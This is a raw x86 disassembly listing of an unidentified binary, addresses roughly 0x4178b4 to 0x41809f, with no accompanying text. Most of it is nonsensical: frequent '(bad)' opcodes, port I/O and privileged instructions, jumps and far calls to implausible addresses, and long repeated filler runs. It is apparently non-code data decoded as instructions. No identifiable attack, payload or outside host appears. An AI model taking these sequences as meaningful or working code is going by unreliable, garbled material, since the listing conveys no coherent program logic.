  4178b4:	fadd   DWORD PTR [eax]
  4178b6:	je     0x4178c1
  4178b8:	xchg   DWORD PTR [esi+0x6816dbed],ebx
  4178be:	(bad)  
  4178bf:	int3   
  4178c0:	add    cl,ch
  4178c2:	xor    al,BYTE PTR [eax]
  4178c4:	mov    ch,0x41
  4178c6:	out    dx,eax
  4178c7:	or     DWORD PTR [eax],eax
  4178c9:	sbb    BYTE PTR [ebx+ecx*8+0x4b],bh
  4178cd:	push   ecx
  4178ce:	mov    bl,0x4d
  4178d0:	clc    
  4178d1:	jmp    0x47eaff05
  4178d6:	addr16 retf 
  4178d8:	xchg   DWORD PTR [ecx],esi
  4178da:	ins    DWORD PTR es:[edi],dx
  4178db:	call   0xb9b5d8fd
  4178e0:	out    dx,al
  4178e1:	pusha  
  4178e2:	ins    DWORD PTR es:[edi],dx
  4178e3:	add    edi,ebp
  4178e5:	jo     0x417889
  4178e7:	sbb    eax,ecx
  4178e9:	jo     0x41795e
  4178eb:	dec    ecx
  4178ec:	loope  0x417931
  4178ee:	cwde   
  4178ef:	sahf   
  4178f0:	stos   BYTE PTR es:[edi],al
  4178f1:	fmul   DWORD PTR [eax-0x7d8f28e7]
  4178f7:	mov    eax,esp
  4178f9:	fisub  WORD PTR [ebp-0x42f8304e]
  4178ff:	retf   
  417900:	pop    es
  417901:	sti    
  417902:	mov    edx,0x2dd1bfd9
  417907:	clc    
  417908:	(bad)  
  417909:	jo     0x4178fb
  41790b:	dec    eax
  41790c:	loope  0x4178e4
  41790e:	xor    eax,0xca1800c6
  417913:	nop
  417914:	fadd   DWORD PTR [eax]
  417916:	add    cl,cl
  417918:	lods   eax,DWORD PTR ds:[esi]
  417919:	or     BYTE PTR [ecx],dh
  41791b:	retf   0xd094
  41791e:	shl    eax,0xb
  417921:	sub    eax,0x7dca51c8
  417926:	jecxz  0x417923
  417928:	sbb    DWORD PTR [edi],ebp
  41792a:	xor    edi,ecx
  41792c:	add    DWORD PTR [ebp+0x2ad99d8],0x31
  417933:	call   0x2ebd:0xa0c1c894
  41793a:	rol    BYTE PTR [ecx-0x36],1
  41793d:	jge    0x417922
  41793f:	daa    
  417940:	fiadd  WORD PTR [eax]
  417942:	add    cl,ch
  417944:	add    BYTE PTR [ebp+0x10ad49d8],0x31
  41794b:	dec    ecx
  41794c:	xchg   esp,eax
  41794d:	enter  0xf0c1,0x8
  417951:	sub    eax,0x7dca11d0
  417956:	jecxz  0x4178df
  417958:	or     eax,0x82790f0b
  41795d:	xchg   DWORD PTR [ebp+0x50],eax
  417960:	retf   
  417961:	fild   WORD PTR [ecx+ebp*2]
  417964:	rol    DWORD PTR [ebp+0x807cb18],1
  41796a:	add    al,0xe3
  41796c:	pop    es
  41796d:	or     BYTE PTR [ecx+0x5b5dfd48],cl
  417973:	shl    DWORD PTR [eax+0xc40c259],1
  417979:	dec    edi
  41797a:	push   esi
  41797b:	add    bl,al
  41797d:	add    BYTE PTR [esp+ecx*1],ah
  417980:	mov    esi,0x8247490
  417985:	xor    si,0x3827
  41798a:	int    0xf
  41798c:	mov    esi,0x31b70bca
  417991:	jb     0x4179c4
  417993:	mov    esi,DWORD PTR [edx-0x56]
  417996:	xor    eax,ebp
  417998:	fs int3 
  41799a:	aam    0xfd
  41799c:	mov    DWORD PTR [edx+0x4d],ebp
  41799f:	aas    
  4179a0:	xor    edx,ecx
  4179a2:	or     ah,bh
  4179a4:	out    0x76,al
  4179a6:	add    al,0xb5
  4179a8:	out    0x7,eax
  4179aa:	das    
  4179ab:	call   0xfe15e620
  4179b0:	pop    ecx
  4179b1:	cli    
  4179b2:	dec    esp
  4179b3:	aas    
  4179b4:	xor    DWORD PTR [edx-0x71410634],ecx
  4179ba:	xor    ebx,DWORD PTR [ecx-0xd]
  4179bd:	mov    ecx,0x94b85301
  4179c2:	xor    DWORD PTR [eax+0x2],edx
  4179c5:	sub    edi,DWORD PTR [esi]
  4179c7:	or     BYTE PTR [edx-0x374fa34],ch
  4179cd:	sub    DWORD PTR [edi],ebp
  4179cf:	push   eax
  4179d0:	cdq    
  4179d1:	ins    BYTE PTR es:[edi],dx
  4179d2:	aad    0xfd
  4179d4:	xchg   cl,cl
  4179d6:	cmp    DWORD PTR [eax+esi*8-0x4f],esi
  4179da:	xchg   BYTE PTR [ebx+0x79],al
  4179dd:	mov    eax,ds:0x6d00f5e9
  4179e2:	(bad)  
  4179e3:	shr    DWORD PTR [eax-0x77],cl
  4179e6:	jge    0x417a2a
  4179e8:	add    BYTE PTR [esp+esi*2+0x184950d9],ch
  4179ef:	aad    0xfd
  4179f1:	dec    esi
  4179f2:	mov    DWORD PTR [ecx],edi
  4179f4:	jae    0x4179e6
  4179f6:	mov    cl,0x86
  4179f8:	inc    ebx
  4179f9:	cmp    DWORD PTR [ecx-0x39ca2617],esp
  4179ff:	rcl    DWORD PTR [ecx-0x44],1
  417a02:	jne    0x4179dd
  417a04:	push   eax
  417a05:	sbb    DWORD PTR [ebx],esi
  417a07:	aad    0xfd
  417a09:	push   ds
  417a0a:	or     al,BYTE PTR [edx+0x7d]
  417a0d:	add    eax,0xefca965
  417a12:	pop    esi
  417a13:	pusha  
  417a14:	jmp    0x37392fc9
  417a19:	addr16 xchg edx,eax
  417a1b:	and    al,0xfc
  417a1d:	test   eax,0x7280eb3c
  417a22:	rcl    DWORD PTR [edi],0x37
  417a25:	fld    st(3)
  417a27:	mov    dl,0xd3
  417a29:	fcom   QWORD PTR [esp+ebp*1-0x55757e2c]
  417a30:	cld    
  417a31:	popa   
  417a32:	mov    cl,0x84
  417a34:	iret   
  417a35:	(bad)  
  417a36:	(bad)  
  417a37:	jmp    FWORD PTR [ebx]
  417a39:	inc    ebp
  417a3a:	dec    eax
  417a3b:	out    0x80,eax
  417a3d:	jb     0x417a00
  417a3f:	pop    ss
  417a40:	fadd   st(4),st
  417a42:	lds    esi,FWORD PTR [esi-0x2d]
  417a45:	add    BYTE PTR [ecx],bl
  417a47:	popa   
  417a48:	repz inc esp
  417a4a:	xor    DWORD PTR [esp+ebp*4+0x70b101d3],edx
  417a51:	ror    BYTE PTR [esi+eax*8-0x6d7ace9e],1
  417a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a59:	shl    DWORD PTR [esi-0x2582bcb4],cl
  417a5f:	mov    eax,0x47e5abcf
  417a64:	out    0x80,eax
  417a66:	repnz rcl BYTE PTR [edi+0x26c4ccdb],0xd3
  417a6e:	leave  
  417a6f:	loopne 0x417a04
  417a71:	inc    esp
  417a72:	xor    DWORD PTR [esp+ebp*4-0x774f1e2d],edx
  417a79:	iret   
  417a7a:	cmp    al,0xc6
  417a7c:	jb     0x417aaf
  417a7e:	xor    eax,0xb6d3a492
  417a83:	dec    ebx
  417a84:	add    ch,dh
  417a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a87:	(bad)  
  417a88:	lock or DWORD PTR [edx+0x3a],0x49b1e93f
  417a90:	clc    
  417a91:	cmp    ebp,ebp
  417a93:	dec    ebx
  417a94:	cld    
  417a95:	(bad)  
  417a96:	jecxz  0x417ac8
  417a98:	pop    eax
  417a99:	push   esp
  417a9a:	je     0x417aa5
  417a9c:	mov    ebp,DWORD PTR [ebx*8+0x100e858]
  417aa3:	(bad)  
  417aa4:	std    
  417aa5:	pop    ds
  417aa6:	mov    al,0x49
  417aa8:	clc    
  417aa9:	sbb    DWORD PTR [eax],eax
  417aab:	std    
  417aac:	test   al,0xf9
  417aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aaf:	add    ecx,DWORD PTR [eax-0x6df70e3a]
  417ab5:	inc    ebx
  417ab6:	cdq    
  417ab7:	add    dh,BYTE PTR [ecx-0x3c1c6d2f]
  417abd:	pop    esi
  417abe:	and    dh,BYTE PTR [esi*4-0x3a5554a5]
  417ac5:	push   esp
  417ac6:	pusha  
  417ac7:	cdq    
  417ac8:	inc    ebp
  417ac9:	in     al,dx
  417aca:	pop    ebp
  417acb:	xor    eax,0x58ba0009
  417ad0:	pop    esp
  417ad1:	mov    DWORD PTR [edx+ecx*4-0x4e1a8c70],edi
  417ad8:	mov    DWORD PTR [eax+0x50c3634f],eax
  417ade:	push   ecx
  417adf:	mov    eax,ds:0xce9fdc5
  417ae4:	or     DWORD PTR [eax+0x11],ebp
  417ae7:	or     DWORD PTR [esi],eax
  417ae9:	add    BYTE PTR [ecx-0x1b],al
  417aec:	(bad)  
  417aed:	std    
  417aee:	es cmp eax,0x9a6b8adb
  417af4:	cmp    DWORD PTR [edi],edi
  417af6:	jmp    0xab7387c5
  417afb:	mov    bh,0xc2
  417afd:	or     BYTE PTR [eax],al
  417aff:	lods   al,BYTE PTR ds:[esi]
  417b00:	fadd   st(3),st
  417b02:	test   DWORD PTR [eax+0x19fffbda],esi
  417b08:	or     DWORD PTR [eax],eax
  417b0a:	add    BYTE PTR [ebx],dh
  417b0c:	cld    
  417b0d:	test   al,dh
  417b0f:	add    BYTE PTR [ecx-0x10018b74],ah
  417b15:	fisubr DWORD PTR ds:0x871df3d2
  417b1b:	test   DWORD PTR [edi+edx*8-0x5],esp
  417b1f:	inc    DWORD PTR [ecx-0x50018374]
  417b25:	(bad)  
  417b27:	test   DWORD PTR [edi+edx*8],esp
  417b2a:	sti    
  417b2b:	call   DWORD PTR [ebx+0x44]
  417b2e:	jl     0x417b2e
  417b30:	(bad)  
  417b31:	fimul  DWORD PTR [ebx]
  417b33:	mov    esi,0x7fe08ddb
  417b38:	push   ebx
  417b39:	xchg   esp,eax
  417b3a:	jl     0x417b3a
  417b3c:	scas   eax,DWORD PTR es:[edi]
  417b3d:	fimul  DWORD PTR [ebx]
  417b3f:	mov    dh,0xef
  417b41:	pop    ss
  417b42:	clc    
  417b43:	mov    BYTE PTR [ecx+0x5bffffd2],bl
  417b49:	dec    ebx
  417b4a:	jg     0x417b46
  417b4c:	nop
  417b4d:	push   ebx
  417b4e:	add    DWORD PTR [eax-0x398ef2ad],eax
  417b54:	mov    BYTE PTR [edx],0xe8
  417b57:	imul   ebx,esi,0xffffffd9
  417b5a:	sti    
  417b5b:	xor    DWORD PTR [ebp-0x100001ab],0xc
  417b62:	cmp    BYTE PTR [ebx],0x58
  417b65:	pop    ebx
  417b66:	mov    ds:0xfe54dd83,eax
  417b6b:	dec    DWORD PTR [edi]
  417b6d:	or     eax,0x8bdd9e71
  417b72:	cmp    dh,0x0
  417b75:	das    
  417b76:	ficom  DWORD PTR [eax-0x18]
  417b79:	xor    DWORD PTR [ebx+0x73310002],edx
  417b7f:	das    
  417b80:	pop    ecx
  417b81:	test   al,0x1e
  417b83:	sub    eax,0x36b239c2
  417b88:	xchg   DWORD PTR [ecx+esi*1],ecx
  417b8b:	loopne 0x417b19
  417b8d:	xor    BYTE PTR [edx+0x37f5101],dh
  417b93:	jnp    0x417bf0
  417b95:	cmp    DWORD PTR [edi],esi
  417b97:	push   esi
  417b98:	or     al,0xb4
  417b9a:	xor    al,0x81
  417b9c:	(bad)  
  417b9d:	(bad)  
  417b9e:	shl    BYTE PTR [ecx],cl
  417ba0:	call   0x432d9b
  417ba5:	pop    ebx
  417ba6:	mov    dl,0x59
  417ba8:	fcomp  DWORD PTR [ecx+esi*8+0x3]
  417bac:	call   0xfe11f0b3
  417bb1:	and    BYTE PTR [eax+0x1ce9827b],al
  417bb7:	inc    ecx
  417bb8:	add    BYTE PTR [ecx-0x4dbdec4b],bh
  417bbe:	xchg   edi,eax
  417bbf:	icebp  
  417bc0:	jnp    0x417b82
  417bc2:	jb     0x417b4a
  417bc4:	js     0x417b75
  417bc6:	inc    edx
  417bc7:	sar    bh,1
  417bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bca:	mov    cl,0x1
  417bcc:	jmp    0x8812a4d6
  417bd1:	lods   al,BYTE PTR ds:[esi]
  417bd2:	in     eax,0xcf
  417bd4:	std    
  417bd5:	mov    fs,WORD PTR [eax]
  417bd7:	mov    dh,0xe9
  417bd9:	add    BYTE PTR [ecx+0x27],al
  417bdc:	xchg   BYTE PTR [edi+edi*2+0x52],dh
  417be0:	rol    BYTE PTR [edi-0x2303254],1
  417be6:	outs   dx,BYTE PTR ds:[esi]
  417be7:	add    al,BYTE PTR [esi-0x3005988c]
  417bed:	mov    DWORD PTR [ebp+esi*2+0x856fdcf],ebp
  417bf4:	not    BYTE PTR [ecx+0x50078830]
  417bfa:	mov    eax,0x3cd19385
  417bff:	ret    
  417c00:	ficomp WORD PTR [ecx+0x7afef9f4]
  417c06:	cs int 0xea
  417c09:	add    esi,DWORD PTR [eax+0x47]
  417c0c:	push   0xffffffcd
  417c0e:	inc    ecx
  417c0f:	inc    esp
  417c10:	in     al,0x83
  417c12:	pop    eax
  417c13:	or     DWORD PTR [esi+eax*8+0x67],ebx
  417c17:	pop    ebx
  417c18:	iret   
  417c19:	into   
  417c1a:	or     al,bl
  417c1c:	(bad)  
  417c1d:	adc    edx,0x41
  417c20:	int    0xcf
  417c22:	hlt    
  417c23:	or     DWORD PTR [edi+0xb],esp
  417c26:	xor    DWORD PTR [esi+eax*4],edi
  417c29:	sub    DWORD PTR [edx-0x23304abf],0x9
  417c30:	xor    al,0x6e
  417c32:	stos   BYTE PTR es:[edi],al
  417c33:	mov    WORD PTR [edi-0x32],fs
  417c36:	int3   
  417c37:	ret    0xdc37
  417c3a:	mov    cs,WORD PTR [ecx]
  417c3c:	out    0x3,eax
  417c3e:	add    BYTE PTR [ebx+eiz*2+0x32],bl
  417c42:	jge    0x417c09
  417c44:	fs test eax,0x1557aefc
  417c4a:	aaa    
  417c4b:	mov    eax,0x14f3cb4d
  417c50:	mov    cs,WORD PTR [ebx]
  417c52:	sub    BYTE PTR ds:0x2ab6c2b,bh
  417c58:	push   cs
  417c59:	jo     0x417c21
  417c5b:	mov    edx,0xbb65f741
  417c60:	or     bh,ah
  417c62:	fisubr DWORD PTR [ecx]
  417c64:	xchg   esp,eax
  417c65:	mov    bh,0xf3
  417c67:	mov    bh,0xca
  417c69:	lds    edx,FWORD PTR [ebx+eax*4]
  417c6c:	adc    al,BYTE PTR [eax]
  417c6e:	jle    0x417c13
  417c70:	push   edi
  417c71:	sub    DWORD PTR [ecx],0x6de85255
  417c77:	data16 (bad) 
  417c79:	std    
  417c7a:	xchg   ecx,eax
  417c7b:	call   0xf6ff:0x5ae93f3d
  417c82:	push   cs
  417c83:	data16 adc al,0xb5
  417c86:	and    ah,BYTE PTR [edx+0x5c]
  417c89:	call   0xfe057c07
  417c8e:	or     DWORD PTR [edx+0x36],0xeafae93f
  417c95:	mul    dh
  417c97:	call   DWORD PTR [ebx]
  417c99:	mov    ch,0xc2
  417c9b:	inc    ebx
  417c9c:	pop    ebx
  417c9d:	call   0xfe0562d7
  417ca2:	add    BYTE PTR cs:[edi+0x60],al
  417ca6:	ret    0x32f1
  417ca9:	pop    eax
  417caa:	mov    DWORD PTR ds:0xc1511119,ebx
  417cb0:	fstp   TBYTE PTR [edx-0x38525103]
  417cb6:	sub    cl,0x32
  417cb9:	or     DWORD PTR [eax+0x25ec1],edi
  417cbf:	(bad)  
  417cc1:	mov    dl,BYTE PTR [ecx]
  417cc3:	push   0xfffffff2
  417cc5:	or     al,0x81
  417cc7:	stos   BYTE PTR es:[edi],al
  417cc8:	ss (bad) 
  417cca:	push   edi
  417ccb:	hlt    
  417ccc:	in     eax,dx
  417ccd:	or     BYTE PTR [edx-0x7a],dh
  417cd0:	stos   BYTE PTR es:[edi],al
  417cd1:	pusha  
  417cd2:	jae    0x417cfc
  417cd4:	sub    eax,0x83701090
  417cd9:	mov    al,al
  417cdb:	in     eax,0xb3
  417cdd:	mov    DWORD PTR [esp+edx*1],0xe93f35cd
  417ce4:	loopne 0x417c99
  417ce6:	pop    ecx
  417ce7:	add    BYTE PTR [edx],bl
  417ce9:	or     al,BYTE PTR [eax]
  417ceb:	push   ebx
  417cec:	jecxz  0x417cdf
  417cee:	and    ecx,DWORD PTR [eax]
  417cf0:	mov    ebx,0x7f8e8dd
  417cf5:	sar    DWORD PTR [ebp-0x3d],cl
  417cf8:	fadd   DWORD PTR ds:0x6dd00000
  417cfe:	je     0x417d41
  417d00:	dec    eax
  417d01:	ds jns 0x5010340
  417d08:	add    BYTE PTR [ebx-0x2fc2fb34],bl
  417d0e:	popa   
  417d0f:	cmp    eax,0xb8df9a00
  417d14:	pop    eax
  417d15:	popf   
  417d16:	inc    ebp
  417d17:	add    BYTE PTR [ebx-0x7cefbbf5],cl
  417d1d:	fist   DWORD PTR [ecx]
  417d1f:	jg     0x417ce1
  417d21:	or     al,0x10
  417d23:	fdiv   DWORD PTR [ebp+0x49]
  417d26:	add    eax,0xcb13ef72
  417d2b:	add    al,0x0
  417d2d:	cmp    eax,0xf483e144
  417d32:	lods   eax,DWORD PTR ds:[esi]
  417d33:	push   eax
  417d34:	push   esi
  417d35:	push   ebx
  417d36:	lock pop es
  417d38:	mov    ebp,DWORD PTR ds:0x90458909
  417d3e:	cmc    
  417d3f:	dec    esi
  417d40:	call   0x3d4afa
  417d45:	push   ebp
  417d46:	dec    eax
  417d47:	lock push eax
  417d49:	and    eax,0xc050084a
  417d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d4f:	clc    
  417d50:	jmp    DWORD PTR [edi]
  417d52:	inc    eax
  417d53:	inc    ecx
  417d54:	call   0x11010791
  417d59:	retf   
  417d5a:	in     al,0xcf
  417d5c:	clc    
  417d5d:	out    0xcd,eax
  417d5f:	push   0x42de3158
  417d64:	add    BYTE PTR [ebp+eiz*2-0x3aa6af37],ah
  417d6b:	retf   0xfd
  417d6e:	data16 fisubr DWORD PTR [ecx]
  417d71:	je     0x417d63
  417d73:	mov    cl,0x7e
  417d75:	inc    ebx
  417d76:	popa   
  417d77:	mov    ds:0xe7486dd9,al
  417d7c:	retf   0xe968
  417d7f:	xchg   ebp,eax
  417d80:	inc    edx
  417d81:	add    BYTE PTR [ebp+ebp*2-0x6eb6af27],ch
  417d88:	retf   0x2efd
  417d8b:	cmp    ebp,DWORD PTR ds:0xd164bafc
  417d91:	xchg   DWORD PTR [esi+esi*4+0x7a],esi
  417d95:	pop    ebx
  417d96:	and    DWORD PTR [ebx],ebp
  417d98:	sub    eax,0xdbecbaf4
  417d9d:	xchg   DWORD PTR [esi+edx*8+0x7a],ebp
  417da1:	pop    ebx
  417da2:	or     DWORD PTR [edx-0x54],ecx
  417da5:	je     0x417e17
  417da7:	mov    dl,0x7e
  417da9:	inc    ebx
  417daa:	jmp    0xe87b59d0
  417daf:	jle    0x417d7d
  417db1:	push   0x40fdf9
  417db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db7:	in     al,0xd3
  417db9:	push   eax
  417dba:	(bad)  
  417dbc:	retf   0xc6fd
  417dbf:	sbb    DWORD PTR [esp+esi*2+0x437eb270],ebp
  417dc6:	leave  
  417dc7:	add    esp,ebx
  417dc9:	sbb    eax,0x89cc86a8
  417dce:	add    al,0x3e
  417dd0:	js     0x417e15
  417dd2:	add    BYTE PTR [ecx-0x5703b9d8],ah
  417dd8:	or     al,0xd4
  417dda:	mov    esp,ebp
  417ddc:	or     BYTE PTR [ebx+0x78],bl
  417ddf:	repnz mov al,0x70
  417de2:	inc    esi
  417de3:	test   DWORD PTR [ecx+0x6109dbb4],edx
  417de9:	aam    0x42
  417deb:	xor    DWORD PTR [esi-0x4efe3454],ecx
  417df1:	inc    eax
  417df2:	retf   
  417df3:	pop    esp
  417df4:	mov    edi,0x49e22bbf
  417df9:	out    0x7e,eax
  417dfb:	repnz mov eax,0xc058dbb7
  417e01:	push   ds
  417e02:	int3   
  417e03:	leave  
  417e04:	pusha  
  417e05:	pushf  
  417e06:	inc    edx
  417e07:	xor    DWORD PTR [esi-0x4e7e245c],ecx
  417e0d:	and    al,0xcb
  417e0f:	and    al,0xbf
  417e11:	xchg   ebp,eax
  417e12:	jle    0x417e86
  417e14:	rcl    DWORD PTR [edi-0x113e5225],0xcb
  417e1b:	mov    edx,0xba33ef47
  417e20:	inc    esp
  417e21:	xlat   BYTE PTR ds:[ebx]
  417e22:	xor    al,0x9
  417e24:	aaa    
  417e25:	iret   
  417e26:	retf   
  417e27:	hlt    
  417e28:	mov    ah,BYTE PTR [ebp+0x2c8c84f4]
  417e2e:	fadd   QWORD PTR [ecx-0x2333ae4f]
  417e34:	mov    esi,0xae002f15
  417e39:	lods   eax,DWORD PTR ds:[esi]
  417e3a:	or     al,0xc6
  417e3c:	cmp    DWORD PTR [ecx],ecx
  417e3e:	cmp    al,0x7d
  417e40:	ror    BYTE PTR [eax-0x41418775],cl
  417e46:	out    0x36,eax
  417e48:	pop    edi
  417e49:	push   esi
  417e4a:	bound  ebp,QWORD PTR [ecx]
  417e4c:	cmp    DWORD PTR [edx-0x7b440804],edx
  417e52:	addr16 retf 0xbe9c
  417e56:	add    BYTE PTR [ecx],bl
  417e58:	jne    0x417eaf
  417e5a:	(bad)  
  417e5b:	outs   dx,BYTE PTR ds:[esi]
  417e5c:	jp     0x417e91
  417e5e:	add    cl,dl
  417e60:	fidivr DWORD PTR [edx]
  417e62:	aas    
  417e63:	jmp    0x573d24c2
  417e68:	push   0xffffffee
  417e6a:	shl    DWORD PTR [ebx-0x49],1
  417e6d:	loope  0x417ee2
  417e6f:	test   al,0x32
  417e71:	xchg   ecx,eax
  417e72:	add    al,0xfb
  417e74:	hlt    
  417e75:	xchg   edx,edi
  417e77:	shr    esi,1
  417e79:	lods   eax,DWORD PTR ds:[esi]
  417e7a:	lds    esp,FWORD PTR [ebp+edi*8-0x42]
  417e7e:	std    
  417e7f:	es sub al,0x9
  417e82:	add    cl,ch
  417e84:	pop    edi
  417e85:	push   ebp
  417e86:	xchg   DWORD PTR [ecx],ebx
  417e88:	mov    ah,0x89
  417e8a:	je     0x417e9b
  417e8c:	cli    
  417e8d:	mov    ebx,0xf9061b2f
  417e92:	mov    BYTE PTR [ecx+eax*4-0x41],ah
  417e96:	std    
  417e97:	not    BYTE PTR [ebp+0xef7c8a]
  417e9d:	sti    
  417e9e:	mov    ebx,0xbf766cfd
  417ea3:	std    
  417ea4:	fidivr WORD PTR [edi-0x6e]
  417ea7:	jl     0x417e80
  417ea9:	jmp    0x417e66
  417eab:	or     eax,0xe088378f
  417eb0:	inc    esi
  417eb1:	data16 cmp BYTE PTR [edi+edi*4-0x15],0xbb
  417eb7:	or     eax,0xf7ee2b7f
  417ebc:	popa   
  417ebd:	xor    eax,0x6fe901c7
  417ec2:	dec    ebx
  417ec3:	and    DWORD PTR [ebx+0x690342ca],0xa7730927
  417ecd:	pusha  
  417ece:	push   edi
  417ecf:	call   0xfc14b6d4
  417ed4:	dec    DWORD PTR [ebx]
  417ed6:	imul   edi,DWORD PTR [eax-0x2],0x8000d31f
  417edd:	ret    
  417ede:	or     DWORD PTR [ecx-0x59],esi
  417ee1:	sbb    edx,DWORD PTR [ecx-0x2d200188]
  417ee7:	add    BYTE PTR [ebp-0x2],dh
  417eea:	inc    eax
  417eeb:	add    DWORD PTR [eax+0x50fbd2fe],0xfff9d000
  417ef5:	pop    ds
  417ef6:	repz pop ebp
  417ef8:	pop    ebx
  417ef9:	rcl    ebp,1
  417efb:	pop    ecx
  417efc:	ret    0x950
  417eff:	push   ecx
  417f00:	mov    DWORD PTR [eax],eax
  417f02:	xor    eax,0x86534ffa
  417f07:	ds push ecx
  417f09:	or     bl,dl
  417f0b:	lock or ecx,DWORD PTR [ebx-0x36d1473b]
  417f12:	mov    ds:0xd4880ebc,al
  417f17:	shl    ebp,0x8a
  417f1a:	add    al,0xb6
  417f1c:	test   DWORD PTR [ecx+eiz*8],eax
  417f1f:	inc    ebp
  417f20:	jg     0x417f1b
  417f22:	add    BYTE PTR [ebp-0x17],al
  417f25:	push   ebx
  417f26:	cmp    bl,ch
  417f28:	lods   al,BYTE PTR ds:[esi]
  417f29:	cli    
  417f2a:	(bad)  
  417f2c:	sub    eax,0x17c18dd2
  417f31:	mov    dl,ah
  417f33:	push   ss
  417f34:	xor    al,BYTE PTR [ecx]
  417f36:	pusha  
  417f37:	or     BYTE PTR [edx-0x7d],al
  417f3a:	mov    ds:0xc9f079bd,al
  417f3f:	jbe    0x417ecb
  417f41:	inc    esp
  417f42:	(bad)
  417f45:	add    al,0xda
  417f47:	inc    esi
  417f48:	jg     0x417f44
  417f4a:	xor    DWORD PTR [edx-0x8f00ebb],ebp
  417f50:	js     0x417f3e
  417f52:	add    al,0x70
  417f54:	clc    
  417f55:	call   FWORD PTR [esi+0x310001b2]
  417f5b:	mov    dl,0x1
  417f5d:	add    BYTE PTR [ecx],dh
  417f5f:	mov    dl,0x1
  417f61:	add    BYTE PTR [ecx],dh
  417f63:	mov    dl,0x1
  417f65:	add    BYTE PTR [eax],al
  417f67:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f6d:	add    DWORD PTR [eax],eax
  417f6f:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f75:	add    DWORD PTR [eax],eax
  417f77:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f7d:	add    DWORD PTR [eax],eax
  417f7f:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f85:	add    DWORD PTR [eax],eax
  417f87:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f8d:	add    DWORD PTR [eax],eax
  417f8f:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f95:	add    DWORD PTR [eax],eax
  417f97:	xor    DWORD PTR [edx-0x4dceffff],esi
  417f9d:	add    DWORD PTR [eax],eax
  417f9f:	xor    DWORD PTR [edx-0x4dceffff],esi
  417fa5:	add    DWORD PTR [eax],eax
  417fa7:	xor    DWORD PTR [edx-0x4dceffff],esi
  417fad:	add    DWORD PTR [eax],eax
  417faf:	xor    DWORD PTR [edx-0x4dceffff],esi
  417fb5:	add    DWORD PTR [eax],eax
  417fb7:	xor    DWORD PTR [edx-0x4dceffff],esi
  417fbd:	add    DWORD PTR [eax],eax
  417fbf:	xor    DWORD PTR [edx+0x9310001],esi
  417fc5:	out    0x3,eax
  417fc7:	xor    DWORD PTR [ecx],ecx
  417fc9:	out    0x3,eax
  417fcb:	add    BYTE PTR [ecx],dh
  417fcd:	or     edi,esp
  417fcf:	add    esi,DWORD PTR [ecx]
  417fd1:	or     edi,esp
  417fd3:	add    esi,DWORD PTR [ecx]
  417fd5:	or     edi,esp
  417fd7:	add    esi,DWORD PTR [ecx]
  417fd9:	or     edi,esp
  417fdb:	add    esi,DWORD PTR [ecx]
  417fdd:	or     edi,esp
  417fdf:	add    esi,DWORD PTR [ecx]
  417fe1:	or     edi,esp
  417fe3:	add    esi,DWORD PTR [ecx]
  417fe5:	or     edi,esp
  417fe7:	add    esi,DWORD PTR [ecx]
  417fe9:	or     edi,esp
  417feb:	add    esi,DWORD PTR [ecx]
  417fed:	or     edi,esp
  417fef:	add    esi,DWORD PTR [ecx]
  417ff1:	or     edi,esp
  417ff3:	add    esi,DWORD PTR [ecx]
  417ff5:	or     edi,esp
  417ff7:	add    esi,DWORD PTR [ecx]
  417ff9:	or     edi,esp
  417ffb:	add    esi,DWORD PTR [ecx]
  417ffd:	or     edi,esp
  417fff:	add    esi,DWORD PTR [ecx]
  418001:	or     edi,esp
  418003:	add    esi,DWORD PTR [ecx]
  418005:	or     edi,esp
  418007:	add    esi,DWORD PTR [ecx]
  418009:	or     edi,esp
  41800b:	add    esi,DWORD PTR [ecx]
  41800d:	or     esp,esp
  41800f:	std    
  418010:	cmp    ecx,DWORD PTR [edi]
  418012:	mov    BYTE PTR [ebx],dh
  418014:	jne    0x418046
  418016:	mov    DWORD PTR [ebx],esp
  418018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418019:	clc    
  41801a:	int3   
  41801b:	adc    eax,DWORD PTR [esi-0x17]
  41801e:	(bad)  
  41801f:	push   ss
  418020:	push   ecx
  418021:	jmp    0xe9d3db98
  418026:	pop    ecx
  418027:	pop    ecx
  418028:	pop    esi
  418029:	sub    eax,0xe983614b
  41802e:	pop    edx
  41802f:	pop    esp
  418030:	add    BYTE PTR [edx-0x17],dl
  418033:	dec    eax
  418034:	popa   
  418035:	pop    ebp
  418036:	xor    eax,0xff11524c
  41803b:	psubw  mm5,QWORD PTR [eax]
  41803e:	inc    esi
  41803f:	add    BYTE PTR [esi+0x65],al
  418042:	xor    dh,BYTE PTR [edx+0x40]
  418045:	xor    WORD PTR [ecx+ecx*8+0x1a],si
  41804a:	sub    BYTE PTR [edi],ah
  41804c:	leave  
  41804d:	sbb    eax,0x49d136f2
  418052:	imul   DWORD PTR [edi]
  418054:	fnstenv ds:0x550061e9
  41805a:	dec    edi
  41805b:	ins    DWORD PTR es:[edi],dx
  41805c:	add    al,0x3
  41805e:	and    al,0x63
  418060:	pop    es
  418061:	push   ebp
  418062:	inc    edx
  418063:	(bad)  
  418064:	cli    
  418065:	adc    DWORD PTR [ebx],ebp
  418067:	sub    al,0x9
  418069:	hlt    
  41806a:	sub    al,0x6c
  41806c:	or     DWORD PTR [ebx+0x22],eax
  41806f:	gs sar esi,0x37
  418073:	and    BYTE PTR [ebx-0x449cc82f],bh
  418079:	in     al,dx
  41807a:	and    eax,0x10580f64
  41807f:	or     esp,ebx
  418081:	or     DWORD PTR [edx+esi*2],ebp
  418084:	les    edx,FWORD PTR [edx]
  418086:	and    ch,BYTE PTR [esi-0x71]
  418089:	out    0x36,eax
  41808b:	imul   ecx,DWORD PTR [eax-0x7892de1a],0x38
  418092:	jmp    0x764215fe
  418097:	cmp    DWORD PTR [edx],edi
  418099:	(bad)  
  41809a:	inc    edi
  41809b:	xor    al,0x75
  41809d:	jbe    0x4180db
  41809f:	and    ah,BYTE PTR [edx+0x7a]
